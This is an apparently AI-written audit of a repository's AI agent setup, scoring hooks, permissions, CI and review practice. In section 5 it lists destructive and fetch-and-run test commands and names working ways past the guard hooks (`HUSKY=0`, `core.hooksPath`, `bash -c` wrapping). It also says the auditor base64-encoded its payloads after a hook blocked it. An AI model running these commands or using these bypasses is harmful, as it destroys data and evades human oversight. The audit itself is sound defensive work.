# AI Development Setup Audit

Audited: 2026-10-28 · Commit: 4b42fde · Rubric: [docs/setup-rubric.md](setup-rubric.md) · Auditor: independent read-only subagent

Method notes:

- Every claim below was checked against files, command output or the GitHub API (GET only).
- Repo docs, including the earlier reports in `ai-audit/`, were treated as claims to test, not as evidence.
- The live `guard-bash` hook in this session blocked my first test command because the command's text contained `--no-verify`. After that, test payloads were base64-encoded in the outer shell and only piped as stdin to the hook scripts.
- `HOOK_BLOCK_LOG=/dev/null` was set so the tests wrote nothing to the log. The one harness-made log line from this audit is identified under section 5.
- No secret values were printed.

## Summary

| Parameter                | Security critical | Score       | Verdict                                                                                                                                                                                               |
| ------------------------ | ----------------- | ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Instructions & Memory    | No                | 2           | AGENTS.md is the single source and CLAUDE.md imports it; 54 lines in total; the commands run and exit correctly; path-scoped rules are in place.                                                      |
| Skills & Commands        | No                | 1           | Five lean skills with verify steps. But there's no PR-review or migration skill, and `run-evals` spends credit yet the model can invoke it.                                                           |
| Subagents & Roles        | No                | 2           | Six single-purpose agents with explicit tools, read-only reviewers and word limits. No worktree isolation.                                                                                            |
| MCP Servers & Plugins    | Yes               | 1           | No repo MCP servers, auto-approve is off, and the inventory is thorough. The enabled user-scope plugin and the claude.ai connectors are not inventoried, and the inventory's owner handle is invalid. |
| Guardrails & Hooks       | Yes               | 1           | Strong, tested hooks that fail closed. But agent config (CLAUDE.md, AGENTS.md, agents, skills, `.husky`) can be written freely, and the hook skip can be bypassed with `HUSKY=0` or `core.hooksPath`. |
| Permissions & Secrets    | Yes               | 1           | Committed allow/ask/deny policy, bypass disabled, gitleaks clean. No sandbox, no egress allowlist, no push protection, no managed policy.                                                             |
| Context & Cost           | No                | 1           | Small always-on context and on-demand rules. Nothing measured, no `/clear` or `/compact` guidance, and the budget alert is a TODO.                                                                    |
| Knowledge Base & Docs    | No                | 2           | Architecture doc, 5 ADRs, a verified clone-to-green and a where-to-find-what map. Some doc drift.                                                                                                     |
| Verification & Testing   | No                | 1           | Fast headless checks and tests in PRs. But CI `verify` fails on every recent PR, and PRs were merged with 0 reviews and red checks.                                                                   |
| Git & Review Workflow    | Yes               | 1           | Only AI attribution passes. `master` is unprotected, CODEOWNERS can't resolve its owner, PRs are 2–5k lines, and ai-review fails on every run.                                                        |
| CI & Autonomous Runs     | Yes               | 2           | All headless runs are documented and have fork gating, minimal tokens, allowlists, max turns and timeouts. Some residual risks.                                                                       |
| Governance & Ownership   | No                | 1           | Written policy and committed config. The owner handle is invalid, the backup owner is overdue, and no CI enforcement is in effect.                                                                    |
| Observability & Feedback | No                | 1           | Block log, dev-metrics and AI_LOG exist. Telemetry is off, there are no cost alerts, and the metrics are stale.                                                                                       |
| Data & Compliance        | Yes               | 1           | Data rules are synthetic-only and fixtures follow them. No licence or IP guidance, no transcript retention, no account or data-terms record.                                                          |
| **Total**                |                   | **18 / 28** |                                                                                                                                                                                                       |

## 1. Instructions & Memory

**Score: 2 / 2**

**Evidence**

- `CLAUDE.md:1` is `@AGENTS.md`, and `AGENTS.md:3` says "Single source of truth for every AI coding tool".
- `docs/ai-policy.md:7` says Claude Code is the only approved tool. No `.cursor/`, `.windsurf/`, `.github/copilot-instructions.md` or Codex config is tracked: `git ls-files | grep -iE 'cursor|windsurf|copilot|codex'` returned nothing.
- Size is well under 200 lines:
  ```
  $ wc -l CLAUDE.md AGENTS.md
      6 CLAUDE.md
     48 AGENTS.md
  ```
- The commands in `AGENTS.md:24-25` run and return correct exit codes:
  ```
  $ npm run test:one -- server/src/gate/leave-policy.schema.test.ts   → 15 passed, real 0m0.782s, rc=0
  $ npm run test:one -- server/src/nope.test.ts                       → missing-path rc=2
  $ npm run typecheck → rc=0 · npm run lint → rc=0 · npm test → 124 files / 1944 tests passed
  ```
- Path-scoped rules exist, each with `paths:` frontmatter:
  - `.claude/rules/gate.md:2-3` (`server/src/gate/**`)
  - `.claude/rules/agents.md:2-3`
  - `.claude/rules/web.md:2-3`
- Personal files are gitignored:
  ```
  $ git check-ignore -v .claude/settings.local.json CLAUDE.local.md
  .gitignore:13:.claude/settings.local.json	.claude/settings.local.json
  .gitignore:12:CLAUDE.local.md	CLAUDE.local.md
  ```
- Every doc path linked from `AGENTS.md:13-16` exists.

**Gaps**

- `AGENTS.md:9` describes the monorepo as `server/` and `web/` but leaves out the `shared/` workspace (`package.json:5-9`).
- `.claude/worktrees/` is untracked but not gitignored. `git check-ignore` printed nothing for it, so a whole second copy of the repo could be committed by accident.

## 2. Skills & Commands

**Score: 1 / 2**

**Evidence**

- `.claude/skills/` holds five skills, each under 60 lines: `fix-issue` (28), `new-feature` (35), `change-policy` (35), `run-evals` (54), `open-pr` (55).
- Every skill has `name`, `description` and `argument-hint`. Every description says both what the skill does and when to use it (for example `fix-issue/SKILL.md:3`).
- Arguments are used instead of hard-coded values: `new-feature/SKILL.md` uses `arguments: [feature]` and `$feature`.
- Each skill ends with a verification section (for example "Verify before saying done" in `fix-issue`).
- `open-pr` is set up correctly as a side-effect workflow:
  - `disable-model-invocation: true` (`open-pr/SKILL.md:6`)
  - a narrow `allowed-tools` read-only git/gh list (`:7`)
  - it runs `gh pr create` only after the user says yes (`:3`)

**Gaps**

- There's no committed PR-review skill or command. Review depends on the `code-reviewer` subagent being called from `new-feature`. There's also no migration workflow.
- `run-evals` has a side effect but no manual-only setting:
  - It spends API credit and writes `evals/results/`.
  - It has no `disable-model-invocation` (`run-evals/SKILL.md:1-7`).
  - `allowed-tools: Bash(npm run evals), Bash(npm run evals -- *)` lets it run without a prompt.
- `open-pr/SKILL.md:8` uses `disallowed-tools`. That isn't a documented skill frontmatter key, so it may be silently ignored.

## 3. Subagents & Roles

**Score: 2 / 2**

**Evidence**

- `.claude/agents/` has 6 agents. Each one has an explicit `tools:`, `model:` and `maxTurns:` (frontmatter lines 2-7). For example:
  - `code-reviewer.md`: `tools: Read, Grep, Glob`, `model: fable`, `effort: high`, `maxTurns: 25`
- The reviewers are read-only (`Read, Grep, Glob`): `code-reviewer`, `policy-auditor` and `security-reviewer`.
- Each agent has a return format with a length cap:
  - `code-reviewer.md:43` "Return format (max 300 words)"
  - `policy-auditor.md:26` (a table plus 50 words)
  - writers: 150 words
- Model choices are justified for each agent in `docs/dev-agents.md:7-12`.
- There's an independent verifier (`code-reviewer`), and it is told never to write "approved" or "LGTM" (`code-reviewer.md:53`).
- A trust rule says agents that read untrusted content get only Read, Grep and Glob (`docs/dev-agents.md:36-50`). No agent has the `Agent` tool.

**Gaps**

- No agent sets `isolation: worktree`: `grep -rn isolation .claude/agents .claude/skills` found nothing. Parallel writers share one working tree.
- Write paths are limited only by prompt. `eval-drafter` and `spec-writer` can overwrite any file, and `test-writer` has `Bash` (`docs/dev-agents.md:54`). The `agent_type` hook follow-up (`:57-62`) hasn't been done.
- The `fable` model alias can't be verified from the repo.

## 4. MCP Servers & Plugins

**Score: 1 / 2**

**Evidence**

- No project MCP config exists, and user scope has no servers for this project:
  ```
  $ ls .mcp.json
  ls: cannot access '.mcp.json': No such file or directory
  $ node -e '...~/.claude.json keys only...'
  top mcpServers: []
  project mcpServers: [] enabledMcpjson: [] disabled: [] allowedTools: []
  ```
- Bulk auto-approval is off: `.claude/settings.json:53` `"enableAllProjectMcpServers": false`.
- `docs/mcp-inventory.md` is thorough:
  - "CLI first" policy (`:7`)
  - 6 servers assessed, each with purpose, source, pinned version, credentials and scopes (`:32-166`)
  - the MongoDB config to use if adopted is pinned to `mongodb-mcp-server@3.0.5`, takes credentials as `${MDB_MCP_CONNECTION_STRING}` and runs with `--readOnly` (`:71-86`)
- The CI GitHub MCP server is pinned to an image SHA and receives only the job token (`docs/ci-agents.md:104`).
- `--strict-mcp-config` is set in CI (`.github/workflows/ai-review.yml:72`).

**Gaps**

- A user-scope plugin is enabled but appears nowhere in the inventory, and there's no record of its hooks or scripts being reviewed:
  ```
  $ node -e '...~/.claude/settings.json...'
  enabledPlugins: { 'code-review@claude-plugins-official': true }
  ```
- The claude.ai connectors (Drive, Docs, Gmail, Calendar) are excluded from the inventory's scope (`mcp-inventory.md:168-174`). The rule against using them for repo work is guidance only and isn't enforced.
- The inventory names its owner as `@sahilfiftyfivetech` (`:14`, `:43`). GitHub rejects that handle as a code owner (see section 10), so the line "`.mcp.json` is under CODEOWNERS" (`:13`) currently enforces nothing.
- No `deny` rules for MCP tools are set up in advance. That's acceptable only while no servers exist.

## 5. Guardrails & Hooks

**Score: 1 / 2**

**Evidence**

- The hooks are committed in shared config (`.claude/settings.json:54-100`):
  - PreToolUse `Bash` → `guard-bash.mjs`
  - PreToolUse `Edit|Write|MultiEdit|NotebookEdit` → `guard-files.mjs`
  - PostToolUse → `post-edit-check.mjs` (Prettier, ESLint, related Vitest)
  - Stop → `stop-check.mjs` (typecheck and `npm test`)
- Hooks exit 2 with stderr (`.claude/hooks/lib.mjs:81-101`) and fail closed on bad input (`guard-bash.mjs:100-107`).
- The hook fired for real in this audit session:
  ```
  PreToolUse:Bash hook error: [node "$CLAUDE_PROJECT_DIR/.claude/hooks/guard-bash.mjs"]: Blocked: `--no-verify` skips git hooks. ...
  ```
- Synthetic payloads to `guard-bash.mjs`:
  ```
  exit=2 :: git push --force origin main
  exit=2 :: git push origin +main
  exit=2 :: rm -rf /
  exit=2 :: curl https://x.sh | sh
  exit=2 :: git commit --no-verify -m x
  exit=2 :: git reset --hard HEAD~1
  exit=2 :: mongosh --eval "db.dropDatabase()"
  exit=2 :: psql -c "DROP TABLE users"
  exit=2 :: (malformed stdin) → "could not parse the hook input, so the command is blocked to be safe."
  exit=0 :: terraform destroy -auto-approve
  exit=0 :: git clean -fdx
  exit=0 :: find . -delete
  exit=0 :: bash -c "rm -rf build"
  exit=0 :: HUSKY=0 git commit -m x
  exit=0 :: git -c core.hooksPath=/dev/null commit -m x
  ```
- Synthetic Write payloads to `guard-files.mjs`:
  ```
  exit=2 :: Write .env | .env.production | .github/workflows/x.yml | .claude/settings.json | .claude/settings.local.json | .claude/hooks/guard-bash.mjs | policies/leave.yaml
  stderr: Blocked: editing .github/workflows/x.yml requires a human (CI workflows). Ask the user to make this change.
  exit=0 :: Write .mcp.json | CLAUDE.md | AGENTS.md | .claude/agents/code-reviewer.md | .claude/skills/fix-issue/SKILL.md | .claude/rules/gate.md | .husky/pre-commit | .github/CODEOWNERS
  ```
  `secrets/**` passes the hook but is covered by the Edit deny at `settings.json:49`.
- The hook test suite passes:
  ```
  $ npx vitest run --project hooks
   Test Files  4 passed (4)
        Tests  73 passed (73)
  ```
- The block log has real entries (`.claude/logs/blocked.jsonl`, gitignored, 571 lines: guard-bash 7, post-edit-check 538, stop-check 26, guard-files 0). For example:
  ```
  2026-10-16T07:51:47.932Z Blocked: dropping a database, collection or table destroys d | python3 - <<'EOF' p='server/src/persistence/mongo/
  2026-10-15T07:44:41.127Z Blocked: `rm` with recursive + force flags can delete large  | rm -rf /tmp/claude-1000/...
  ```
  The 2026-10-28T03:22:57Z entry was created by this audit's blocked command, and the 2026-10-07 entry is an `echo` smoke test.
- The pre-commit secret scan fails closed if gitleaks is missing (`.husky/pre-commit:4-11`): `gitleaks git --pre-commit --staged --redact`.
- There's a human-approval list: the `ask` rules at `settings.json:18-40` cover commit, push, branch delete or move, npm install, and docker.

**Gaps**

- Agent config can be written without approval: `CLAUDE.md`, `AGENTS.md`, `.claude/agents|skills|rules/`, `.mcp.json`, `.husky/pre-commit` and `.github/CODEOWNERS`. An agent could edit `.husky/pre-commit` to remove the gitleaks scan.
- The `--no-verify` block can be bypassed with `HUSKY=0` or `git -c core.hooksPath=…`. The `git commit` ask rule is the only backstop.
- These all pass the hook (`docs/ai-policy.md:57` admits quoted commands aren't caught):
  - `terraform destroy`, `git clean -fdx`, `find -delete`
  - shell-wrapped commands such as `bash -c "rm -rf …"`
  - writes through Bash, such as `echo > .env`
- guard-files has never blocked anything in real use (0 log entries).

## 6. Permissions & Secrets

**Score: 1 / 2**

**Evidence**

- A committed allow/ask/deny policy denies `.env` and secrets, and bypass mode is disabled (`.claude/settings.json:3-52`, jq isn't installed):
  ```
  "deny": ["Read(.env)","Read(.env.*)","Read(!.env.example)","Edit(.env)","Edit(.env.*)","Edit(!.env.example)","Read(secrets/**)","Edit(secrets/**)"],
  "disableBypassPermissionsMode": "disable"
  ```
- There's no local settings file, and it would be gitignored:
  ```
  $ ls .claude/settings.local.json
  ls: cannot access '.claude/settings.local.json': No such file or directory
  $ git check-ignore -v .env
  .gitignore:8:.env*	.env
  ```
- A Bash read of `.env` was refused in this session. In a non-interactive subagent I can't tell whether a deny rule or an unanswered prompt refused it.
  ```
  $ head -c 0 .env
  Permission to use Bash with command head -c 0 .env ... has been denied.
  ```
- Secret scanning:
  - Tracked history:
    ```
    $ gitleaks git -v --redact .
    INF 45 commits scanned.
    INF no leaks found
    ```
  - Working tree: the one finding is in a file that is untracked, gitignored and never committed:
    ```
    $ gitleaks dir -v --redact . | grep -E '^(RuleID|File|Line):'
    RuleID:      generic-api-key
    File:        .env
    Line:        9
    $ git log --all --oneline -- .env     → (empty)
    ```
  - Untracked worktree `.claude/worktrees/`: `gitleaks dir --redact .claude/worktrees` → `no leaks found`.
- None of `sandbox`, `bypassPermissions` or `defaultMode` appears in `.claude/settings.json` or `~/.claude/settings.json`.

**Gaps**

- The sandbox is off and network egress isn't allowlisted. No `sandbox` key is set, and `docs/ai-policy.md:13` ("never disable the sandbox") refers to a sandbox that was never enabled.
- There's no `.devcontainer/` for opening untrusted repos in isolation.
- Push protection isn't on:
  ```
  $ gh api repos/sahiltgi/multi-agent-admin --jq .security_and_analysis
  null
  ```
- There's no central managed policy: `ls /etc/claude-code` → "No such file or directory".
- `Bash(npm run evals)` is allow-listed (`settings.json:11`). That script loads `.env` (`package.json:23`), so an agent can spend credit with the real `.env` API key without a prompt.
- `Read(!.env.example)`-style negation inside deny rules isn't documented syntax. `docs/ai-policy.md:38` acknowledges this.

## 7. Context & Cost

**Score: 1 / 2**

**Evidence**

- The always-on instructions are 54 lines (CLAUDE.md plus AGENTS.md). Situational guidance is in path-scoped rules (`.claude/rules/*.md`, 15–17 lines each) and in skills (`CONTRIBUTING.md:57-64`).
- No MCP servers are loaded (section 4).
- Hook output is trimmed to the last 60 lines (`post-edit-check.mjs:69`, `stop-check.mjs:33`).
- Per-session cost is meant to be recorded through `/cost` in `AI_LOG.md` (`docs/ai-policy.md:77-79`).

**Gaps**

- Startup context has never been measured with `/context`. This can't be checked from the repo, and nothing records it.
- There's no `/clear` or `/compact` guidance and no model-per-task guidance for the main session. A grep for `/clear|/compact|/context` in AGENTS.md, CLAUDE.md, CONTRIBUTING.md and the docs found nothing. Model choice is documented only for subagents.
- There's no `.claudeignore` or equivalent exclusion. The untracked `.claude/worktrees/` copy is picked up by tooling: `npm run format:check` warns on `.claude/worktrees/.../docs/brief.md`.
- No spend alerts: "Budget alert: `TODO(owner)`" (`docs/ai-policy.md:87-93`). Admin cost consoles can't be checked from the repo.

## 8. Knowledge Base & Docs

**Score: 2 / 2**

**Evidence**

- `docs/architecture.md` (components, request flow, trust boundary, repo layout) is linked from `AGENTS.md:14`.
- There are 5 ADRs in `docs/adr/` (0001–0005), each with a status and date (for example `0004-deterministic-policy-gate.md:3`).
- `README.md:5-19` gives a clone-to-green path: `npm ci`, `docker compose up -d`, `npm test`. `npm test` was verified green locally (124 files, 1944 tests).
- There's a where-to-find-what map at `README.md:21-37`.
- Docs are updated alongside code: the last 5 commits that touch AGENTS.md, CLAUDE.md or `docs/architecture.md` are feature PRs #15–#19.
- The handbook is synthetic, first-party content (`docs/architecture.md`, repo layout).

**Gaps**

- `docs/architecture.md:85-87` still says "Module layout (planned)… Most parts don't exist yet", but almost all of those modules now exist. At 117 lines the doc isn't concise.
- There's no `.devcontainer/` or Makefile, so setup relies on local Node 24 and Docker.
- External doc links are dated ("checked … on 2026-10-25", `ai-policy.md:75`) rather than version-pinned.
- There's no documented review of Claude auto-memory.
- `docs/dev-metrics.md:5-7` is stale: generated 2026-10-26 against HEAD `6319f4f`.

## 9. Verification & Testing

**Score: 1 / 2**

**Evidence**

- Headless commands with real exit codes all pass locally:
  ```
  typecheck rc=0 (9.4s) · lint rc=0 (31s) · npm test: 124 files, 1944 tests passed (22.4s)
  $ time npm run test:one -- server/src/gate/leave-policy.schema.test.ts
  Tests  15 passed (15)   real 0m0.782s
  ```
- No skipped or focused tests: a grep for `.skip(`, `.only(` and `.todo(` across tracked `*.test.ts(x)` found 0.
- 9 of the last 10 merged PRs include test or eval files. #11, which is CI and workflow config only, has none:
  ```
  #19 tests=9 · #18 tests=7 · #17 tests=12 · #16 tests=23 · #15 tests=8 · #14 tests=7 · #13 tests=1 · #12 tests=24 · #11 tests=0 · #10 tests=19
  ```
- The PR template requires pasted verification output (`.github/pull_request_template.md:17-24`), and #19's body has it.
- There's a Playwright e2e suite (`e2e/`, `npm run e2e`).

**Gaps**

- CI `verify` is red. It stops at `npm audit` (an undici advisory), so typecheck, lint, test and build haven't run in CI recently:
  ```
  #12..#18 verify:FAILURE · #19 verify:FAILURE, ai-review:FAILURE
  verify	Run npm audit --audit-level=high ... ##[error]Process completed with exit code 1.
  ```
- CI checks aren't required for merge. `master` is unprotected (section 10), and PRs merged with red checks.
- There's no human review:
  ```
  #10–#19 reviews=0 mergedBy=sahiltgi
  ```
  The template checklist (`pull_request_template.md:26-36`) is never exercised, which makes every merge a rubber stamp.
- There's no SAST. CodeQL and dependency review are absent (`ci.yml:1-3`). Only `npm audit` and gitleaks run.
- e2e doesn't run in CI.

## 10. Git & Review Workflow

**Score: 1 / 2**

**Evidence**

- AI attribution is used: 9 of the last 10 non-merge commits carry a `Co-authored-by: Claude…` trailer, matching the policy in `CONTRIBUTING.md:92-100`. `c9dad18` (policy-qa) has none.
- CODEOWNERS lists the agent and config paths (`.github/CODEOWNERS:4-12`): `/AGENTS.md`, `/CLAUDE.md`, `/.claude/`, `/.mcp.json`, `/.husky/`, `/.github/`, `/policies/`, `/prompts/` and `/evals/`.
- GitHub state:
  ```
  $ gh api repos/sahiltgi/multi-agent-admin/branches/master --jq '{protected, protection}'
  {"protected":false,"protection":{"enabled":true,"required_status_checks":{"checks":[],"contexts":[],"enforcement_level":"off"}}}
  $ gh api repos/sahiltgi/multi-agent-admin/branches/master/protection
  {"message":"Upgrade to GitHub Pro or make this repository public to enable this feature.","status":"403"}
  $ gh api repos/sahiltgi/multi-agent-admin/rulesets   → same 403
  $ gh api repos/sahiltgi/multi-agent-admin/codeowners/errors --jq '.errors|length, (map(.kind)|unique)'
  9
  ["Unknown owner"]
  $ gh api repos/sahiltgi/multi-agent-admin/collaborators --jq '.[]|{login,role_name}'
  {"login":"sahiltgi","role_name":"admin"}
  ```

**Gaps**

- The default branch `master` isn't protected: there are no required PR reviews or checks and no force-push block. `docs/ai-policy.md:71` says this is "Set by hand", but the API shows it isn't.
- CODEOWNERS doesn't work. All 9 lines name `@sahilfiftyfivetech`, which GitHub reports as an unknown owner without write access.
- Agents don't run under a least-privilege identity. The local `gh` is logged in as `sahiltgi`, the sole admin, so an agent session on this machine has merge rights. Only the default prompt for `gh` stands in the way: no ask or deny rule covers `gh pr merge`.
- PRs are far over the ~400-line limit (`CONTRIBUTING.md:70`). Changed lines excluding `package-lock.json`:
  ```
  #19 3671 · #18 2058 · #17 5136 · #16 3372 · #15 2286 · #14 3182 · #13 1468 · #12 3706 · #11 642 · #10 2894
  ```
- AI review doesn't supplement human review: ai-review fails on every run (`Claude execution failed: result is_error:true`), and there are 0 human reviews.

## 11. CI & Autonomous Runs

**Score: 2 / 2**

**Evidence**

- All headless runs are listed in `docs/ci-agents.md:5-8`: `evals.yml` (`npm run evals`) and `ai-review.yml` (claude-code-action). `ci.yml` calls no model.
- Untrusted triggers are gated:
  - no `pull_request_target` and no `issue_comment` triggers
  - fork PRs are skipped (`ai-review.yml:21-24`, `evals.yml:32`)
  - drafts and bot-opened PRs are skipped (`ai-review.yml:23-24`)
- Tokens are minimal:
  - workflow-level `permissions: {}` (`ai-review.yml:11`, `evals.yml:22`)
  - `ci.yml:12-13` grants `contents: read`
  - ai-review's job grants `contents: read` and `pull-requests: write` (`ai-review.yml:27-29`)
  - checkout uses `persist-credentials: false`
  - repo settings:
    ```
    $ gh api repos/sahiltgi/multi-agent-admin/actions/permissions/workflow
    {"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}
    ```
- Tool and turn limits (`ai-review.yml:69-74`): `--max-turns 15`, `--setting-sources user`, `--strict-mcp-config`, an explicit `--allowedTools` list of 6 read and comment tools, and `--disallowedTools` covering Bash, Read, Edit, Write, Web* and the GitHub write tools.
- Timeouts are set: `timeout-minutes` 15 (ai-review), 20 and 10 (ci), and 75 per job plus 25 and 45 per step (evals).
- Changes can land only as PRs: CI has no push rights, and `docs/ci-agents.md:71` says results are never committed back.
- Runners are ephemeral GitHub-hosted `ubuntu-latest`. Eval artifacts are kept 30 days (`evals.yml:77`). Actions are SHA-pinned.
- The two keys are separate secrets, one per workflow:
  ```
  $ gh secret list
  ANTHROPIC_API_KEY_EVALS	2026-10-23
  ANTHROPIC_API_KEY_REVIEW	2026-10-23
  ```

**Gaps**

- A PR controls its own reviewer's instructions. The ai-review prompt is read from the PR checkout (`ai-review.yml:36-45`, `cat prompts/ci/ai-review.md`).
- Secrets are repository-scoped, not Environment-scoped. Any same-repo branch can change `evals` code or the workflows and read the keys. `docs/ci-agents.md:129-136` acknowledges this.
- Org and repo settings don't enforce what the workflows do: `{"enabled":true,"allowed_actions":"all","sha_pinning_required":false}`.
- Both model jobs are currently failing: ai-review on every PR, and the scheduled evals run (`40477659966 evals schedule failure master`).

## 12. Governance & Ownership

**Score: 1 / 2**

**Evidence**

- Team config is committed (`.claude/settings.json`, hooks, agents, skills and rules are all in `git ls-files`). Personal config is gitignored (`.gitignore:11-14`).
- There's a written AI usage policy covering tools, data, MCP, dangerous modes and review (`docs/ai-policy.md:5-16`). It names a single tool, so it's consistent across tools by definition.
- Onboarding is covered by `CONTRIBUTING.md:5-29,55-64`.
- Every recent change landed through a PR (#10–#19 in `git log`).
- A review date is set: "Next review: 2026-11-01" (`ai-policy.md:16`, `mcp-inventory.md:14`).

**Gaps**

- The named owner `@sahilfiftyfivetech` isn't a valid GitHub owner for this repo (9 CODEOWNERS errors). The actual admin is `sahiltgi`.
- The backup owner is still "TBD (assign before 2026-10-15)" (`ai-policy.md:15`), and that deadline passed 13 days ago.
- Config isn't effectively validated in CI. Hook tests are part of `npm test`, but CI `verify` fails at `npm audit` first. There's no schema check of `.claude/settings.json`.
- "Changes via PR" relies on habit, because nothing enforces it (section 10).
- `.claude/worktrees/` isn't gitignored.
- No quarterly review has happened yet, so there's nothing to show for it.

## 13. Observability & Feedback

**Score: 1 / 2**

**Evidence**

- Blocked actions are tracked locally in `.claude/logs/blocked.jsonl` (571 entries, section 5).
- `npm run dev-metrics` writes AI-assisted commit share, reverts, hook blocks and rules added (`docs/dev-metrics.md:13-20`: "AI-assisted 11 (78.6%)").
- `AI_LOG.md` records what went wrong and which rule each failure led to.
- The policy on prompt logging is correct: `OTEL_LOG_USER_PROMPTS` must never be set (`ai-policy.md:85`).
- App-side cost metrics are specified (`ai-policy.md:96`).

**Gaps**

- Telemetry is off:
  ```
  $ grep -rn "OTEL\|CLAUDE_CODE_ENABLE_TELEMETRY" .claude/settings.json ~/.claude/settings.json
  otel grep rc=1
  ```
  `ai-policy.md:80` confirms "It's off today". Vendor dashboards can't be checked from the repo.
- There are no cost spike alerts (the budget alert is a TODO).
- `AI_LOG.md` has 4 rows, but there are about 10 AI-assisted PRs since 2026-10-15.
- `dev-metrics.md` is stale, and its hook-block counts reflect only one machine.
- No issue labels or retro process tracks AI-related bugs or reverts, and no outcome metrics such as defect rate are split by AI assistance.
- Unattended runs have only an audit trail: GitHub run logs at default retention, plus 30-day eval artifacts.

## 14. Data & Compliance

**Score: 1 / 2**

**Evidence**

- The rules on allowed data are written down:
  - `AGENTS.md:33` "Synthetic data only."
  - `docs/ai-policy.md:8`
  - `docs/brief.md:113-115` "PII minimized in prompts and redacted in logs … No real employee data anywhere in the repo."
- The deny rules enforce this for secrets (`settings.json:41-50`).
- Fixtures use only reserved, non-routable domains:
  ```
  $ git ls-files | xargs grep -hoE '<email regex>' | grep -vE '\.example$|example\.(com|org)$|anthropic\.com$|noreply' | sort | uniq -c
       28 sam.roe@hr.test
        6 bot@example.invalid
        4 user.one@example.test
        2 x@y.test
        2 sam@hr.test
        1 test@example.invalid
  ```
- The CI eval results files hold no case text (`docs/ci-agents.md:70`).

**Gaps**

- There's no licence and no IP guidance:
  ```
  $ ls LICENSE*
  ls: cannot access 'LICENSE*': No such file or directory
  ```
  A grep for "licen" in the policy docs found nothing.
- Nothing records approved org accounts or reviewed data terms:
  - CI keys and GitHub are on a personal Free account (`docs/ci-agents.md:10`)
  - Anthropic account and data-retention terms aren't documented
  - admin consoles can't be checked from the repo
- Transcript retention (Claude Code local transcripts, Anthropic API retention) isn't documented.
- There's no regulatory mapping for an HR system, such as GDPR or a local data-protection law. It's acceptable while data is synthetic, but nothing states that it's out of scope.
- User-scope claude.ai connectors (Gmail, Drive) are reachable from sessions, with only a written "don't use" (`mcp-inventory.md:173`).

## Top gaps by risk

1. **`master` is unprotected and CODEOWNERS is broken (Git, security critical).** `protected:false`, there are 9 "Unknown owner" errors, and all 10 recent PRs were self-merged with 0 reviews while checks were red. Fix:
   - Move the repo to GitHub Pro or an organisation, or make it public.
   - Enable branch protection or rulesets requiring a PR, 1 approval, code-owner review, the `verify` and `gitleaks` checks, and no force push.
   - Fix the CODEOWNERS handle.
2. **Agent sessions run with an admin GitHub identity (Git and Permissions, security critical).** The local `gh` is the sole admin `sahiltgi`. Fix: add `ask` or `deny` rules for `gh pr merge`, `gh api -X`, `gh repo` and `gh secret`, or give agents a fine-grained token with no merge rights.
3. **No sandbox, egress allowlist, push protection or managed policy (Permissions, security critical).** Fix: add `sandbox.enabled` with `network.allowedDomains`, a `.devcontainer/` for untrusted code, and secret scanning push protection (this depends on the plan from item 1). Also remove `Bash(npm run evals)` from `allow`.
4. **Agent config and the pre-commit hook are agent-writable, and the hook skip can be bypassed (Guardrails, security critical).** Fix:
   - Extend `guard-files` HUMAN_ONLY to `CLAUDE.md`, `AGENTS.md`, `.claude/agents|skills|rules/`, `.mcp.json`, `.husky/` and `.github/CODEOWNERS`.
   - Block `HUSKY=0`, `core.hooksPath`, `git clean -f*`, `find … -delete` and `terraform destroy`, and inspect `bash -c`/`sh -c` payloads in `guard-bash`.
   - Add `.claude/worktrees/` to `.gitignore`.
5. **The ai-review prompt comes from the PR branch, and secrets are repo-wide (CI, security critical).** Fix: load `prompts/ci/ai-review.md` from the base ref (`git show origin/master:…`). Move the keys to Environments with required reviewers once the plan allows. Set `sha_pinning_required: true` and restrict `allowed_actions`.
6. **Uninventoried plugin and connectors; no data terms, licence or retention record (MCP and Data, security critical).** Fix:
   - Add `code-review@claude-plugins-official` and the claude.ai connectors to `docs/mcp-inventory.md`, with a review note.
   - Add a LICENSE and an IP/licence section.
   - Document the account type, data-retention terms and transcript retention in `docs/ai-policy.md`.
7. **CI `verify` has been red for every recent PR because of `npm audit` (Verification).** Fix the undici advisory or pin an override so typecheck, lint, test and build run again. Then make `verify` a required check.
8. **PR sizes of 2–5k lines (Git and Verification).** Enforce the 400-line rule with stacked PRs, and add a size-check job.
9. **Governance and observability debt.** Assign the overdue backup owner. Enable OTEL metrics in user or managed settings. Set and record the Console spend alerts. Keep `AI_LOG.md` and `dev-metrics.md` current.
10. **Skills and context.** Make `run-evals` manual-only (`disable-model-invocation: true`). Add a committed PR-review skill. Document `/context`, `/clear` and `/compact` habits and model-per-task guidance. Use `isolation: worktree` for parallel writer subagents.
